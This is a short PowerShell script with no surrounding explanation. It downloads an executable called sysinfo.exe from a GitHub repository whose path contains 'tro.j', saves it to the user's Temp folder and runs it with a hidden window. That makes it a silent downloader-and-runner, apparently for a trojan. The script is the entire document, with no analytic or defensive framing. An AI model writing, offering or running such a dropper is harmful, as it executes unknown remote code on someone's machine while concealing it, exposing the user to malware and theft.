$TempFolder = "$env:USERPROFILE\AppData\Local\Temp"
$url = "https://github.com/gsfv/tro.j/raw/refs/heads/main/sysinfo.exe"
$path = "$TempFolder\sysinfo.exe"
Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
Start-Process -FilePath $path -Wait -WindowStyle Hidden
exit
